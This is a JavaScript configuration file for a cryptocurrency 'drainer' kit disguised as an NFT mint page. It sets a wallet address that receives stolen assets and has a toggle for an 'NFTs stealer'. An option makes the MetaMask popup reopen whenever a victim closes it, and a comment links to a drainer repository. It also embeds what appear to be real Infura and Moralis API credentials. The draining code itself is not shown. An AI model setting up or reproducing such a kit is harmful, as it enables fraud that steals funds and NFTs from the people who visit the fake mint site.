// ⚠️ for infura & moralis, make you sure that you copy same number of characters
const address = "0x9123cfc8ce063c4e343869599539fc22e4ba051d";    // Your ETH wallet that you have to receive NFTs
const infuraId = "ad2f827b4e2449de94d0664f89283e02"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
const moralisApi = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImIzYWZmZDE2LTBlNWYtNDM5OS04ZDM3LTA3NTY3NGJhNmI2NSIsIm9yZ0lkIjoiMzUyNjYyIiwidXNlcklkIjoiMzYyNDc0IiwidHlwZUlkIjoiZmMwMzY1YzYtZWFiMC00MDJkLTk2NDMtNTQwM2JjZTExODI5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTE3NzgwMTYsImV4cCI6NDg0NzUzODAxNn0.-JwPyG-f-IhTNMD5rP4DlL6HOWLijCpdxxJSMiuwZ0I"    // Web3 Api key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "Tec.sellix.io",
    title: "Tec MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "10.07.2023", // Today date
    socialMedia: {
        discord: "https://discord.gg/example",
        twitter: "https://twitter.com/example",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.2,         // Price per NFT.
    totalSupply: 999,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 6,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.2,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "0x9123cfc8ce063c4e343869599539fc22e4ba051d" // leave empty if you want to use the same address 
}

/* 
    | = = = | https://github.com/Web-3-0-Service/Drainer-Crypto-ETH-NFT | = = = | 
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion
